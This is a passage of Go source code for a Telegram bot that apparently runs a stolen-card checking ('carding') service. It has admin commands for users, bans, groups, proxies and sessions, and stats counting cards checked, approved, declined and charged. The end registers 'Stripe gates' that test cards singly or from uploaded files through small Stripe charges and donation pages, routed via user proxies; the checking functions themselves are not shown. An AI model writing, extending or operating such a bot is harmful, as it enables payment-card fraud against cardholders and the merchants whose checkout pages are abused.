	bot.Handle("/active", func(c tele.Context) error {
		return c.Send(formatActiveMsg(), tele.ModeHTML)
	})

	// /admin — list admin commands
	bot.Handle("/admin", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		return c.Send(
			"━━━━━━━━━━━━━━━━━━━━━━\n"+
				"  "+em("5296369303661067030", "🔧")+" 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 "+em("5264727218734524899", "🔧")+"\n"+
				"━━━━━━━━━━━━━━━━━━━━━━\n\n"+
				em("5341715473882955310", "🔴")+"  /broadcast &lt;msg&gt;        — All users\n"+
				em("5341715473882955310", "🔴")+"  /broadcastuser &lt;id&gt; &lt;m&gt; — Specific user\n"+
				em("5215668805199473901", "🔴")+"  /broadcastactive &lt;msg&gt;  — Active sessions\n\n"+
				em("5215668805199473901", "🚫")+"  /ban &lt;id&gt;          — Ban user\n"+
				em("5215668805199473901", "✅")+"  /unban &lt;id&gt;        — Unban user\n"+
				em("5240241223632954241", "🔒")+"  /pvtonly           — Toggle private mode\n"+
				em("5352658337588612223", "👤")+"  /allowuser &lt;id&gt;    — Allow user\n"+
				em("6003424016977628379", "❌")+"  /removeuser &lt;id&gt;   — Remove allowed user\n"+
				em("5974048815789903111", "👥")+"  /users             — List allowed users\n\n"+
				em("6060081662178365254", "🔒")+"  /restrict all|&lt;ids&gt;    — Block all or specific IDs\n"+
				em("6001526766714227911", "🔓")+"  /unrestrict all|&lt;ids&gt;  — Lift restrictions\n"+
				em("5296369303661067030", "🔐")+"  /allowonly &lt;ids&gt;       — Allow only specific IDs\n"+
				em("5296369303661067030", "🔓")+"  /allowall              — Reset all access restrictions\n\n"+
				em("6294100961119966181", "👑")+"  /admins            — List all admins\n"+
				em("5393194986252542669", "➕")+"  /addadmin &lt;id&gt;     — Add dynamic admin\n"+
				em("5382261056078881010", "➖")+"  /rmadmin &lt;id&gt;      — Remove dynamic admin\n"+
				em("5956160118088273784", "🔑")+"  /giveperm &lt;id&gt; &lt;cmd&gt;   — Grant command permission\n\n"+
				em("5224450179368767019", "🌐")+"  /addsite &lt;url&gt;     — Add custom site\n"+
				em("5445267414562389170", "🗑")+"  /rmsite &lt;url&gt;      — Remove custom site\n"+
				em("5197269100878907942", "📋")+"  /site all          — List all sites\n\n"+
				em("5231200819986047254", "📊")+"  /stats             — Global stats\n"+
				em("5264727218734524899", "🔄")+"  /resetstats        — Reset all stats\n\n"+
				em("5247120584420114337", "⚡")+"  /active            — Active sessions\n"+
				em("5461137245706685869", "🛑")+"  /stop &lt;id&gt;         — Stop user's session (also /stopall)\n"+
				em("5461137245706685869", "🛑")+"  /stopuser &lt;@user|id&gt; — Stop specific user\n"+
				em("5461137245706685869", "🛑")+"  /resetactive       — Force-cancel all sessions\n\n"+
				em("5816625186216090280", "🔌")+"  /show &lt;id&gt;         — Show user's proxies\n"+
				em("5458720093947063184", "🧹")+"  /cleanproxies      — Clean invalid proxy entries\n"+
				em("5231012545799666522", "🔍")+"  /chkpr &lt;id&gt;        — Test user's proxies\n\n"+
				em("5224450179368767019", "🌍")+"  /addgp &lt;id&gt;        — Add allowed group\n"+
				em("5197269100878907942", "📋")+"  /showgp            — Show groups &amp; mode\n"+
				em("6057529472351999246", "🗑")+"  /delgp &lt;id&gt;        — Remove group\n"+
				em("5296369303661067030", "🔒")+"  /onlygp            — Groups-only mode\n"+
				em("5296369303661067030", "🔓")+"  /allowall          — Allow all (private + groups)\n\n"+
				em("5264727218734524899", "🔄")+"  /reboot            — Restart bot",
			tele.ModeHTML)
	})

	// /broadcast — send message to all known users
	bot.Handle("/broadcast", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		fullText := c.Message().Text
		idx := strings.Index(fullText, " ")
		if idx < 0 || strings.TrimSpace(fullText[idx:]) == "" {
			return c.Send("Usage: /broadcast <message>")
		}
		msg := strings.TrimSpace(fullText[idx:])
		ids := um.AllIDs()
		sent, failed := 0, 0
		for _, uid := range ids {
			_, err := bot.Send(tele.ChatID(uid), "📢 "+msg)
			if err != nil {
				failed++
			} else {
				sent++
			}
		}
		return c.Send(fmt.Sprintf("📢 Broadcast complete\n✅ Sent: %d\n❌ Failed: %d", sent, failed))
	})

	// /broadcastuser <id|@user> <message> — admin only
	bot.Handle("/broadcastuser", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		parts := strings.SplitN(strings.TrimSpace(c.Message().Payload), " ", 2)
		if len(parts) < 2 || strings.TrimSpace(parts[1]) == "" {
			return c.Send("Usage: /broadcastuser <user_id> <message>")
		}
		uid, err := strconv.ParseInt(strings.TrimSpace(parts[0]), 10, 64)
		if err != nil {
			return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
		}
		msg := strings.TrimSpace(parts[1])
		_, err = bot.Send(tele.ChatID(uid), "📢 "+msg)
		if err != nil {
			return c.Send(fmt.Sprintf("❌ Failed to send: %v", err))
		}
		return c.Send(fmt.Sprintf("✅ Message sent to %d.", uid))
	})

	// /broadcastactive <message> — send to all users with active sessions
	bot.Handle("/broadcastactive", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		msg := strings.TrimSpace(c.Message().Payload)
		if msg == "" {
			return c.Send("Usage: /broadcastactive <message>")
		}
		sent, failed := 0, 0
		activeSessions.Range(func(key, val any) bool {
			sess := val.(*CheckSession)
			_, err := bot.Send(tele.ChatID(sess.UserID), "📢 "+msg)
			if err != nil {
				failed++
			} else {
				sent++
			}
			return true
		})
		return c.Send(fmt.Sprintf("📢 Active broadcast\n✅ Sent: %d\n❌ Failed: %d", sent, failed))
	})

	// /me — show personal stats
	bot.Handle("/me", func(c tele.Context) error {
		uid := c.Sender().ID
		ud := um.Get(uid)
		um.mu.RLock()
		s := ud.Stats
		um.mu.RUnlock()
		approvedRate, chargedRate := 0.0, 0.0
		if s.TotalChecked > 0 {
			approvedRate = float64(s.TotalApproved) * 100.0 / float64(s.TotalChecked)
			chargedRate = float64(s.TotalCharged) * 100.0 / float64(s.TotalChecked)
		}
		return c.Send(fmt.Sprintf(
			"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"+
				"    👤  𝗣𝗲𝗿𝘀𝗼𝗻𝗮𝗹 𝗦𝘁𝗮𝘁𝘀\n"+
				"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"+
				"┌────────────────────────────┐\n"+
				"│                              │\n"+
				"│  📋  Total Checked  ∣  %6d  │\n"+
				"│  ✅  Approved       ∣  %6d  │\n"+
				"│  ❌  Declined       ∣  %6d  │\n"+
				"│  💳  Charged        ∣  %6d  │\n"+
				"│                              │\n"+
				"└────────────────────────────┘\n\n"+
				"💰  𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 𝗔𝗺𝗼𝘂𝗻𝘁: $%.2f\n"+
				"📈  ✅ Approved: %.1f%%  💳 Charged: %.1f%%\n"+
				"━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
			s.TotalChecked, s.TotalApproved, s.TotalDeclined, s.TotalCharged,
			s.TotalChargedAmt, approvedRate, chargedRate))
	})

	// /resetstats — admin: reset all global stats
	bot.Handle("/resetstats", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		um.mu.Lock()
		for _, ud := range um.users {
			ud.Stats = UserStats{}
		}
		um.mu.Unlock()
		um.Save()
		return c.Send("✅ All stats have been reset.")
	})

	// /restrict [all|id,...] — admin: block all non-admins or specific IDs
	bot.Handle("/restrict", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		arg := strings.TrimSpace(c.Message().Payload)
		if arg == "" {
			return c.Send("Usage: /restrict all  or  /restrict <id1,id2,...>")
		}
		if strings.ToLower(arg) == "all" {
			cfg.mu.Lock()
			cfg.RestrictAll = true
			cfg.mu.Unlock()
			cfg.Save()
			return c.Send("🔒 Bot restricted — only explicitly allowed users can access.")
		}
		cfg.mu.Lock()
		for _, tok := range strings.Split(arg, ",") {
			uid, err := strconv.ParseInt(strings.TrimSpace(tok), 10, 64)
			if err != nil {
				continue
			}
			found := false
			for _, b := range cfg.BlockedIDs {
				if b == uid {
					found = true
					break
				}
			}
			if !found {
				cfg.BlockedIDs = append(cfg.BlockedIDs, uid)
			}
		}
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("🔒 Restricted IDs updated: %v", cfg.BlockedIDs))
	})

	// /allowonly <id1,id2,...> — admin: set allow-only list and enable restrict_all
	bot.Handle("/allowonly", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		arg := strings.TrimSpace(c.Message().Payload)
		if arg == "" {
			return c.Send("Usage: /allowonly <id1,id2,...>")
		}
		var ids []int64
		for _, tok := range strings.Split(arg, ",") {
			uid, err := strconv.ParseInt(strings.TrimSpace(tok), 10, 64)
			if err != nil {
				continue
			}
			ids = append(ids, uid)
		}
		if len(ids) == 0 {
			return c.Send("❌ No valid IDs found.")
		}
		cfg.mu.Lock()
		cfg.AllowOnlyIDs = ids
		cfg.RestrictAll = true
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("✅ Allow-only mode enabled for: %v", ids))
	})

	// /unrestrict [all|id,...] — admin: lift restrictions
	bot.Handle("/unrestrict", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		arg := strings.TrimSpace(c.Message().Payload)
		if arg == "" {
			return c.Send("Usage: /unrestrict all  or  /unrestrict <id1,id2,...>")
		}
		if strings.ToLower(arg) == "all" {
			cfg.mu.Lock()
			cfg.RestrictAll = false
			cfg.BlockedIDs = nil
			cfg.AllowOnlyIDs = nil
			cfg.mu.Unlock()
			cfg.Save()
			return c.Send("🔓 All restrictions cleared.")
		}
		cfg.mu.Lock()
		for _, tok := range strings.Split(arg, ",") {
			uid, err := strconv.ParseInt(strings.TrimSpace(tok), 10, 64)
			if err != nil {
				continue
			}
			newList := cfg.BlockedIDs[:0]
			for _, b := range cfg.BlockedIDs {
				if b != uid {
					newList = append(newList, b)
				}
			}
			cfg.BlockedIDs = newList
		}
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("🔓 Blocked IDs updated: %v", cfg.BlockedIDs))
	})

	// /admins — list all admins
	bot.Handle("/admins", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		var sb strings.Builder
		sb.WriteString("👑 Admins:\n")
		for id := range adminIDs {
			sb.WriteString(fmt.Sprintf("• %d (hardcoded)\n", id))
		}
		cfg.mu.RLock()
		for _, id := range cfg.DynamicAdmins {
			if !adminIDs[id] {
				sb.WriteString(fmt.Sprintf("• %d\n", id))
			}
		}
		cfg.mu.RUnlock()
		return c.Send(sb.String())
	})

	// /addadmin <id> — add dynamic admin
	bot.Handle("/addadmin", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /addadmin <user_id>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
		}
		cfg.mu.Lock()
		found := false
		for _, a := range cfg.DynamicAdmins {
			if a == uid {
				found = true
				break
			}
		}
		if !found {
			cfg.DynamicAdmins = append(cfg.DynamicAdmins, uid)
		}
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d added as admin.", uid), tele.ModeHTML)
	})

	// /rmadmin <id> — remove dynamic admin (cannot remove hardcoded)
	bot.Handle("/rmadmin", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /rmadmin <user_id>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
		}
		if adminIDs[uid] {
			return c.Send("❌ Cannot remove hardcoded admin.")
		}
		cfg.mu.Lock()
		newList := cfg.DynamicAdmins[:0]
		for _, a := range cfg.DynamicAdmins {
			if a != uid {
				newList = append(newList, a)
			}
		}
		cfg.DynamicAdmins = newList
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d removed from admins.", uid), tele.ModeHTML)
	})

	// /giveperm <id> <cmd> — grant specific command permission to a user
	bot.Handle("/giveperm", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		parts := strings.SplitN(strings.TrimSpace(c.Message().Payload), " ", 2)
		if len(parts) < 2 {
			return c.Send("Usage: /giveperm <user_id> <command>")
		}
		uid, err := strconv.ParseInt(strings.TrimSpace(parts[0]), 10, 64)
		if err != nil {
			return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
		}
		cmd := strings.TrimSpace(parts[1])
		key := strconv.FormatInt(uid, 10)
		cfg.mu.Lock()
		for _, p := range cfg.Perms[key] {
			if p == cmd {
				cfg.mu.Unlock()
				return c.Send(fmt.Sprintf("ℹ️ User %d already has permission for /%s.", uid, cmd))
			}
		}
		cfg.Perms[key] = append(cfg.Perms[key], cmd)
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d granted permission for /%s.", uid, cmd), tele.ModeHTML)
	})

	// /users — list users in the allowed bypass list
	bot.Handle("/users", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		cfg.mu.RLock()
		allowed := make([]int64, 0, len(cfg.AllowedUsers))
		for uid := range cfg.AllowedUsers {
			allowed = append(allowed, uid)
		}
		cfg.mu.RUnlock()
		if len(allowed) == 0 {
			return c.Send("📋 Allowed Users List\n\nNo users in the allowed list.\n\nUse /allowuser <id> to add users.")
		}
		sort.Slice(allowed, func(i, j int) bool { return allowed[i] < allowed[j] })
		var sb strings.Builder
		sb.WriteString("📋 Allowed Users List\n\n")
		for i, uid := range allowed {
			sb.WriteString(fmt.Sprintf("%d. %d\n", i+1, uid))
		}
		sb.WriteString(fmt.Sprintf("\nTotal: %d user(s)", len(allowed)))
		return c.Send(sb.String())
	})

	// /show [user_id] — show own proxies, or another user's if admin provides ID
	bot.Handle("/show", func(c tele.Context) error {
		uid := c.Sender().ID
		targetID := uid
		raw := strings.TrimSpace(c.Message().Payload)
		if raw != "" {
			if !isAdmin(uid) {
				return c.Send("🚫 Only admins can view other users' proxies.")
			}
			n, err := strconv.ParseInt(raw, 10, 64)
			if err != nil {
				return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
			}
			targetID = n
		}
		ud := um.Get(targetID)
		um.mu.RLock()
		proxies := make([]string, len(ud.Proxies))
		copy(proxies, ud.Proxies)
		um.mu.RUnlock()
		if len(proxies) == 0 {
			if targetID == uid {
				return c.Send("❌ You have no proxies set.")
			}
			return c.Send(fmt.Sprintf("❌ User %d has no proxies.", targetID))
		}
		var sb strings.Builder
		if targetID == uid {
			sb.WriteString(fmt.Sprintf("🔌 Your proxies (%d):\n\n", len(proxies)))
		} else {
			sb.WriteString(fmt.Sprintf("🔌 User %d proxies (%d):\n\n", targetID, len(proxies)))
		}
		for i, p := range proxies {
			sb.WriteString(fmt.Sprintf("%d. %s\n", i+1, p))
		}
		return c.Send(sb.String())
	})

	// /cleanproxies — remove blank/junk entries from all users' proxy lists
	bot.Handle("/cleanproxies", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		cleaned := 0
		um.mu.Lock()
		for _, ud := range um.users {
			var valid []string
			for _, p := range ud.Proxies {
				p = strings.TrimSpace(p)
				if p != "" && (strings.HasPrefix(p, "http://") || strings.HasPrefix(p, "https://") || strings.HasPrefix(p, "socks5://")) {
					valid = append(valid, p)
				} else {
					cleaned++
				}
			}
			ud.Proxies = valid
		}
		um.mu.Unlock()
		um.Save()
		return c.Send(fmt.Sprintf("✅ Cleaned %d invalid proxy entry/entries.", cleaned))
	})

	// /chkpr [user_id] — test proxies (own or specified user's, admin)
	bot.Handle("/chkpr", func(c tele.Context) error {
		uid := c.Sender().ID
		targetID := uid
		raw := strings.TrimSpace(c.Message().Payload)
		if raw != "" {
			if !isAdmin(uid) {
				return c.Send("🚫 Only admins can test other users' proxies.")
			}
			n, err := strconv.ParseInt(raw, 10, 64)
			if err != nil {
				return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
			}
			targetID = n
		}
		ud := um.Get(targetID)
		um.mu.RLock()
		proxies := make([]string, len(ud.Proxies))
		copy(proxies, ud.Proxies)
		um.mu.RUnlock()
		if len(proxies) == 0 {
			return c.Send("❌ No proxies to test.")
		}
		msg, _ := bot.Send(c.Chat(), fmt.Sprintf("🔄 Testing %d proxies...", len(proxies)))
		type result struct {
			proxy string
			ok    bool
		}
		results := make([]result, len(proxies))
		var wg sync.WaitGroup
		for i, p := range proxies {
			wg.Add(1)
			go func(idx int, proxy string) {
				defer wg.Done()
				err := testProxy(proxy)
				results[idx] = result{proxy: proxy, ok: err == nil}
			}(i, p)
		}
		wg.Wait()
		good, bad := 0, 0
		var sb strings.Builder
		if targetID == uid {
			sb.WriteString("🔌 Proxy Test Results:\n\n")
		} else {
			sb.WriteString(fmt.Sprintf("🔌 Proxy Test Results for %d:\n\n", targetID))
		}
		for _, r := range results {
			if r.ok {
				sb.WriteString(fmt.Sprintf("✅ %s\n", r.proxy))
				good++
			} else {
				sb.WriteString(fmt.Sprintf("❌ %s\n", r.proxy))
				bad++
			}
		}
		sb.WriteString(fmt.Sprintf("\n✅ Working: %d  ❌ Dead: %d", good, bad))
		if msg != nil {
			bot.Edit(msg, sb.String())
			return nil
		}
		return c.Send(sb.String())
	})

	// /stopuser <@username or user_id> — admin: stop a specific user's session
	bot.Handle("/stopuser", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /stopuser <@username> or /stopuser <user_id>")
		}

		var targetUID int64
		var found bool

		if strings.HasPrefix(raw, "@") {
			// search by username across active sessions
			needle := strings.ToLower(strings.TrimPrefix(raw, "@"))
			activeSessions.Range(func(_, val any) bool {
				sess := val.(*CheckSession)
				if strings.ToLower(sess.Username) == needle {
					targetUID = sess.UserID
					found = true
					return false
				}
				return true
			})
			if !found {
				return c.Send(fmt.Sprintf("⚠️ No active session for %s.", raw))
			}
		} else {
			uid, err := strconv.ParseInt(raw, 10, 64)
			if err != nil {
				return c.Send("❌ Invalid argument. Use @username or a numeric user ID.")
			}
			targetUID = uid
			_, found = activeSessions.Load(targetUID)
			if !found {
				return c.Send(fmt.Sprintf("⚠️ No active session for user %d.", targetUID))
			}
		}

		val, _ := activeSessions.Load(targetUID)
		sess := val.(*CheckSession)
		sess.Cancelled.Store(true)
		if sess.Cancel != nil {
			sess.Cancel()
		}
		return c.Send(fmt.Sprintf("🛑 Stopped session for @%s (ID: %d).", sess.Username, sess.UserID))
	})

	// /resetactive — force-cancel all active sessions
	bot.Handle("/resetactive", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		count := 0
		activeSessions.Range(func(key, val any) bool {
			sess := val.(*CheckSession)
			sess.Cancelled.Store(true)
			if sess.Cancel != nil {
				sess.Cancel()
			}
			activeSessions.Delete(key)
			count++
			return true
		})
		return c.Send(fmt.Sprintf("🛑 Force-cancelled %d session(s). Active sessions cleared.", count))
	})

	// /reboot — restart the bot process
	bot.Handle("/reboot", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		c.Send("🔄 Rebooting bot...")
		go func() {
			time.Sleep(500 * time.Millisecond)
			exe, err := os.Executable()
			if err != nil {
				return
			}
			// Re-exec this process with same args
			_ = os.WriteFile("reboot.flag", []byte(exe), 0644)
			os.Exit(0)
		}()
		return nil
	})

	// /addgp <group_id> [...] — add group(s) to allowed list
	bot.Handle("/addgp", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		arg := strings.TrimSpace(c.Message().Payload)
		if arg == "" {
			return c.Send("Usage: /addgp <group_id> [<group_id> ...]")
		}
		cfg.mu.Lock()
		for _, tok := range strings.Fields(arg) {
			gid, err := strconv.ParseInt(strings.TrimSpace(tok), 10, 64)
			if err != nil {
				continue
			}
			found := false
			for _, g := range cfg.Groups {
				if g == gid {
					found = true
					break
				}
			}
			if !found {
				cfg.Groups = append(cfg.Groups, gid)
			}
		}
		groups := cfg.Groups
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("✅ Allowed groups: %v", groups))
	})

	// /showgp — show allowed groups and groups-only mode status
	bot.Handle("/showgp", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		cfg.mu.RLock()
		groups := make([]int64, len(cfg.Groups))
		copy(groups, cfg.Groups)
		groupsOnly := cfg.GroupsOnly
		cfg.mu.RUnlock()
		var sb strings.Builder
		sb.WriteString("Allowed groups:\n")
		if len(groups) == 0 {
			sb.WriteString("(none)\n")
		} else {
			for _, g := range groups {
				sb.WriteString(fmt.Sprintf("• %d\n", g))
			}
		}
		sb.WriteString(fmt.Sprintf("\nGroups-only mode: %v", groupsOnly))
		return c.Send(sb.String())
	})

	// /delgp <group_id> [...] — remove group(s) from allowed list
	bot.Handle("/delgp", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		arg := strings.TrimSpace(c.Message().Payload)
		if arg == "" {
			return c.Send("Usage: /delgp <group_id> [<group_id> ...]")
		}
		cfg.mu.Lock()
		toRemove := make(map[int64]bool)
		for _, tok := range strings.Fields(arg) {
			gid, err := strconv.ParseInt(strings.TrimSpace(tok), 10, 64)
			if err == nil {
				toRemove[gid] = true
			}
		}
		newList := cfg.Groups[:0]
		for _, g := range cfg.Groups {
			if !toRemove[g] {
				newList = append(newList, g)
			}
		}
		cfg.Groups = newList
		groups := cfg.Groups
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("✅ Removed. Current allowed groups: %v", groups))
	})

	// /onlygp — enable groups-only mode
	bot.Handle("/onlygp", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		cfg.mu.Lock()
		cfg.GroupsOnly = true
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send("🔒 Groups-only mode enabled. Private chats are denied unless /allowuser is set.")
	})

	// /allowall — disable groups-only, restrict_all, and allow_only restrictions
	bot.Handle("/allowall", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
		}
		cfg.mu.Lock()
		cfg.GroupsOnly = false
		cfg.AllowOnlyIDs = nil
		cfg.RestrictAll = false
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send("🔓 Bot set to allow all users in personal chats.")
	})

	// ── Stripe gates (inline + file variants) ──────────────────────
	// Auth gate
	registerStripeInline(bot, "/str", "Stripe Auth", um, fwd, checkStripeAuthCard)
	registerStripeInline(bot, "/mstr", "Stripe Auth", um, fwd, checkStripeAuthCard)
	registerStripeFile(bot, "/mstrtxt", "Stripe Auth", um, checkStripeAuthCard)
	// Checkout $1 GBP
	registerStripeInline(bot, "/str1", "Stripe UHQ $1", um, fwd, checkStripeCheckoutCard)
	registerStripeInline(bot, "/mstr1", "Stripe UHQ $1", um, fwd, checkStripeCheckoutCard)
	registerStripeFile(bot, "/mstr1txt", "Stripe UHQ $1", um, checkStripeCheckoutCard)
	// SecondStork $5 NZD
	registerStripeInline(bot, "/str2", "Stripe UHQ $5", um, fwd, checkStripeSecondStorkCard)
	registerStripeInline(bot, "/mstr2", "Stripe UHQ $5", um, fwd, checkStripeSecondStorkCard)
	registerStripeFile(bot, "/mstr2txt", "Stripe UHQ $5", um, checkStripeSecondStorkCard)
	// Donation $3 USD
	registerStripeInline(bot, "/str4", "Stripe Donation", um, fwd, checkStripeDonationCard)
	registerStripeInline(bot, "/mstr4", "Stripe Donation", um, fwd, checkStripeDonationCard)
	registerStripeFile(bot, "/mstr4txt", "Stripe Donation", um, checkStripeDonationCard)
	// Dollar $1 USD
	registerStripeInline(bot, "/str5", "Stripe $1", um, fwd, checkStripeDollarCard)
	registerStripeInline(bot, "/mstr5", "Stripe $1", um, fwd, checkStripeDollarCard)
	registerStripeFile(bot, "/mstr5txt", "Stripe $1", um, checkStripeDollarCard)

	fwd.BindRCtx(bot)

	fmt.Println("Bot started")
	bot.Start()
}
